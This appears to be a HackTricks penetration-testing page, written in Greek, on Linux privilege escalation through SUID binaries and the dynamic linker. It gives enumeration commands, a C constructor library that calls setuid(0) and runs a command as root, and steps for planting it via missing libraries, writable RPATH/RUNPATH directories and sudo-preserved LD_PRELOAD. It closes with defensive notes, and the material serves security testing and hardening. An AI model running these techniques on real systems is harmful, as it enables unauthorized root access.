# SUID Shared Library and Linker Abuse

{{#include ../../banners/hacktricks-training.md}}

Τα SUID binaries συνήθως ελέγχονται για άμεση εκτέλεση εντολών, όμως τα custom SUID programs μπορεί επίσης να είναι ευάλωτα μέσω του dynamic linker. Το κοινό μοτίβο είναι απλό: ένα privileged executable φορτώνει κώδικα από ένα path ή configuration που μπορεί να επηρεάσει ένας χρήστης με χαμηλότερα privileges.

Αυτή η σελίδα επικεντρώνεται σε generic technique patterns: missing libraries, writable library directories, `RPATH`/`RUNPATH`, `LD_PRELOAD` μέσω sudo, linker configuration και SUID hardlink confusion.

## Fast Enumeration

Ξεκινήστε εντοπίζοντας ασυνήθιστα SUID files και ελέγχοντας αν είναι dynamically linked:
```bash
find / -perm -4000 -type f -ls 2>/dev/null
file /path/to/suid-binary
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
```
Εστιάστε σε μη τυπικές τοποθεσίες, προσαρμοσμένες διαδρομές εφαρμογών, binaries που ανήκουν στον root αλλά βρίσκονται εκτός καταλόγων που διαχειρίζονται πακέτα, καθώς και dependencies που φορτώνονται από εγγράψιμους καταλόγους.

Χρήσιμοι έλεγχοι δικαιωμάτων εγγραφής:
```bash
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
find / -writable -type d 2>/dev/null | head -n 50
```
## Missing Shared Object Injection

Ορισμένα custom SUID binaries προσπαθούν να φορτώσουν ένα shared object που δεν υπάρχει. Αν το path που λείπει βρίσκεται κάτω από έναν κατάλογο που ελέγχεται από τον attacker, το binary μπορεί να φορτώσει κώδικα που παρέχεται από τον attacker ως ο effective user.

Εντοπίστε αποτυχημένες αναζητήσεις βιβλιοθηκών:
```bash
strace -f -e trace=openat,access /path/to/suid-binary 2>&1 | grep -Ei 'ENOENT|\\.so'
```
Εάν το binary αναζητά το `libexample.so` σε ένα εγγράψιμο path, μια minimal proof library μπορεί να χρησιμοποιήσει έναν constructor. Διατηρήστε το proof-of-impact harmless κατά την επικύρωση:
```c
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
static void init(void) {
setuid(0);
setgid(0);
system("id > /tmp/suid-so-ran");
}
```
Δημιουργήστε το με το ακριβές όνομα αρχείου που προσπαθεί να φορτώσει το binary:
```bash
gcc -shared -fPIC proof.c -o /writable/path/libexample.so
/path/to/suid-binary
cat /tmp/suid-so-ran
```
Η exploitable condition δεν είναι μόνο η missing library. Ο attacker πρέπει να μπορεί να τοποθετήσει ένα compatible shared object σε path που ο privileged loader θα αποδεχτεί.

## Εγγράψιμος Κατάλογος Βιβλιοθηκών

Μερικές φορές όλες οι dependencies υπάρχουν, αλλά ένας από τους directories που χρησιμοποιούνται για την επίλυσή τους είναι writable. Αυτό μπορεί να επιτρέψει την αντικατάσταση μιας loaded library ή την τοποθέτηση μιας library υψηλότερης προτεραιότητας με το ίδιο όνομα.

Ελέγξτε τα dependency paths:
```bash
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
namei -om /path/to/library.so
```
Εάν ο κατάλογος είναι εγγράψιμος, επικυρώστε το με μια προσέγγιση ασφαλή για αντιγραφή σε lab. Η αντικατάσταση system libraries σε live host μπορεί να διακόψει το authentication, τη διαχείριση πακέτων ή υπηρεσίες κρίσιμες για το boot.

## RPATH και RUNPATH

Τα `RPATH` και `RUNPATH` είναι entries του dynamic section που υποδεικνύουν στον loader πού να αναζητήσει libraries. Είναι επικίνδυνα σε προγράμματα SUID όταν δείχνουν σε καταλόγους εγγράψιμους από attacker.

Εντοπίστε τα:
```bash
readelf -d /path/to/suid-binary | egrep 'RPATH|RUNPATH'
objdump -p /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
```
Παράδειγμα επικίνδυνου output:
```text
0x000000000000001d (RUNPATH)            Library runpath: [/opt/app/lib]
0x0000000000000001 (NEEDED)             Shared library: [libcustom.so]
```
Εάν το `/opt/app/lib` είναι εγγράψιμο και το binary χρειάζεται το `libcustom.so`, ο attacker ενδέχεται να μπορεί να τοποθετήσει εκεί ένα κακόβουλο `libcustom.so`:
```bash
ls -ld /opt/app/lib
gcc -shared -fPIC proof.c -o /opt/app/lib/libcustom.so
/path/to/suid-binary
```
`RPATH` και `RUNPATH` δεν είναι πανομοιότυπα σε όλες τις λεπτομέρειες επίλυσης, αλλά για τον έλεγχο privilege-escalation το πρακτικό ερώτημα είναι το ίδιο: αναζητά το SUID binary ένα library name σε directory με δυνατότητα εγγραφής από attacker;

## LD_PRELOAD, LD_LIBRARY_PATH και SUID

Για τα κανονικά προγράμματα, τα `LD_PRELOAD` και `LD_LIBRARY_PATH` μπορούν να επιβάλουν ή να επηρεάσουν τη φόρτωση shared object. Για τα SUID προγράμματα, ο dynamic loader συνήθως ενεργοποιεί secure-execution mode και αγνοεί επικίνδυνες environment variables.

Αυτό σημαίνει ότι ένα απλό SUID binary συνήθως δεν είναι ευάλωτο μόνο και μόνο επειδή ο user μπορεί να ορίσει το `LD_PRELOAD`:
```bash
LD_PRELOAD=/tmp/proof.so /path/to/suid-binary
```
Η συνήθης εξαίρεση είναι η λανθασμένη ρύθμιση του sudo. Αν το `sudo -l` δείχνει ότι μια μεταβλητή όπως η `LD_PRELOAD` ή η `LD_LIBRARY_PATH` διατηρείται, μια εντολή που επιτρέπεται από το sudo μπορεί να φορτώσει κώδικα υπό τον έλεγχο του attacker:
```bash
sudo -l
# Look for env_keep+=LD_PRELOAD or env_keep+=LD_LIBRARY_PATH
sudo LD_PRELOAD=/tmp/proof.so /allowed/command
```
Μην συγχέετε τις παρακάτω περιπτώσεις:

- `LD_PRELOAD` απέναντι σε ένα κανονικό SUID binary: συνήθως αποκλείεται από την secure execution.
- Το `LD_PRELOAD` διατηρείται από το sudo: δυνητικά exploitable.
- Απουσία `.so` σε writable path: exploitable όταν το SUID binary φορτώνει φυσιολογικά αυτό το path.
- `RPATH`/`RUNPATH` προς έναν writable directory: exploitable όταν μπορεί να ελεγχθεί μια απαιτούμενη library.
- Δικαιώματα εγγραφής στο `/etc/ld.so.preload` ή σε linker config: system-wide και υψηλού impact.

## Ρύθμιση Linker

Ο dynamic linker διαβάζει επίσης system configuration, όπως τα `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, το linker cache και, σε ορισμένες περιπτώσεις, το `/etc/ld.so.preload`.

Έλεγχοι υψηλής αξίας:
```bash
ls -l /etc/ld.so.preload /etc/ld.so.conf 2>/dev/null
find /etc/ld.so.conf.d -type f -writable -ls 2>/dev/null
find /etc/ld.so.conf.d -type d -writable -ls 2>/dev/null
ldconfig -v 2>/dev/null | head -n 50
```
Η εγγράψιμη ρύθμιση του linker είναι συνήθως πιο σοβαρή από ένα μεμονωμένο ευάλωτο SUID binary, επειδή μπορεί να επηρεάσει πολλές δυναμικά συνδεδεμένες διεργασίες. Το `/etc/ld.so.preload` είναι ιδιαίτερα επικίνδυνο, επειδή μπορεί να επιβάλει τη φόρτωση ενός shared object σε privileged διεργασίες.

## SUID Hardlink Confusion

Τα hardlinks μπορούν να κάνουν το ίδιο SUID inode να εμφανίζεται με πολλά ονόματα. Αυτό είναι χρήσιμο για την απόκρυψη ενός privileged helper, τη σύγχυση κατά τον καθαρισμό ή την παράκαμψη ενός αφελούς ελέγχου βάσει διαδρομής.

Βρείτε αρχεία SUID με περισσότερα από ένα links:
```bash
find / -xdev -perm -4000 -type f -links +1 -ls 2>/dev/null
```
Ελέγξτε όλες τις διαδρομές προς το ίδιο inode:
```bash
stat /path/to/suid-wrapper
find / -xdev -samefile /path/to/suid-wrapper -ls 2>/dev/null
```
Η κατάχρηση δεν είναι ότι ένα hardlink αλλάζει τα permissions. Η κατάχρηση είναι το path confusion: ένα privileged inode μπορεί να είναι προσβάσιμο μέσω ενός ονόματος που οι defenders ή τα scripts δεν αναμένουν. Για πιο αναλυτικές πληροφορίες σχετικά με το inode και το hardlink workflow, δείτε το [Filesystem, Inodes and Recovery](../main-system-information/filesystem-inodes-and-recovery.md).

## Αμυντικές σημειώσεις

- Διατηρείτε τα SUID binaries ελάχιστα, ελεγμένα και υπό διαχείριση πακέτων όπου είναι δυνατό.
- Αποφεύγετε entries `RPATH`/`RUNPATH` που δείχνουν σε writable ή application-managed directories.
- Διατηρείτε τα library directories με ιδιοκτήτη τον root και χωρίς δυνατότητα εγγραφής από regular users.
- Μην διατηρείτε τα `LD_PRELOAD`, `LD_LIBRARY_PATH` ή παρόμοιες loader variables μέσω του sudo.
- Παρακολουθείτε τα `/etc/ld.so.preload`, `/etc/ld.so.conf`, `/etc/ld.so.conf.d/` και απρόσμενα SUID files.
- Ελέγχετε hardlinked SUID files και διερευνάτε custom SUID wrappers εκτός των standard system paths.
{{#include ../../banners/hacktricks-training.md}}
